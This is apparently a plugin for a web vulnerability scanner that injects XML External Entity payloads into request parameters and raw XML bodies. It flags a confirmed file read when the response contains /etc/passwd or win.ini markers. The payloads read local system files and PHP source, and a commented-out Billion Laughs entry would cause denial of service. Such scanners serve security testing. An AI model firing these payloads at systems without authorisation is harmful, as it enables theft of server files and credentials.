from .base import BasePlugin

class XXEPlugin(BasePlugin):
    """
    XML External Entity (XXE) Injection.
    """
    name = "XXE Injection"

    # XXE Payloads
    PAYLOADS = [
        # Basic File Read
        """<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/passwd">]><root>&test;</root>""",
        """<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///c:/windows/win.ini">]><root>&test;</root>""",
        
        # PHP Wrapper
        """<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "php://filter/convert.base64-encode/resource=index.php">]><root>&test;</root>""",
        
        # Billion Laughs (DoS) - Commented out for safety usually, but can enable mild version
        # """<?xml version="1.0"?><!DOCTYPE lolz [<!ENTITY lol "lol"><!ENTITY lol1 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">]><root>&lol1;</root>""",
        
        # SOAP/XML-RPC Wrapper
        """<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><methodCall><methodName>&xxe;</methodName></methodCall>"""
    ]

    def should_run(self, endpoint):
        # XXE usually requires POST with XML content-type OR just any param injection
        # We will try injecting XML into standard params too, as some parsers accept it.
        return len(endpoint.params) > 0

    def run(self, http, endpoint, analyzer, evidence):
        try:
            base_params = {p['name']: p['value'] for p in endpoint.params}
        except: return

        for param in endpoint.params:
            for payload in self.PAYLOADS:
                fuzzed = base_params.copy()
                fuzzed[param['name']] = payload
                
                try:
                    # 1. Normal Injection
                    resp = self._make_request(http, endpoint, fuzzed)
                    if self._check_resp(resp, evidence, endpoint, param, payload): break
                    
                    # 2. Content-Type Swapping (If originally JSON/Form, try sending XML)
                    if endpoint.method == "POST":
                        # Raw body injection
                        resp_xml = http.request("POST", endpoint.url, data=payload, headers={"Content-Type": "application/xml"})
                        if self._check_resp(resp_xml, evidence, endpoint, param, payload): break

                except: continue

    def _make_request(self, http, endpoint, params):
        if endpoint.method == "POST":
            return http.request("POST", endpoint.url, data=params)
        return http.request("GET", endpoint.url, params=params)

    def _check_resp(self, resp, evidence, endpoint, param, payload):
        if not resp: return False
        
        # Check for LFI markers
        if "root:x:0:0" in resp.text or "[extensions]" in resp.text:
             evidence.add(
                plugin=self.name,
                endpoint=endpoint.url,
                parameter=param['name'],
                payload=payload,
                evidence="XXE File Read Confirmed",
                confidence="CRITICAL"
            )
             return True
        return False
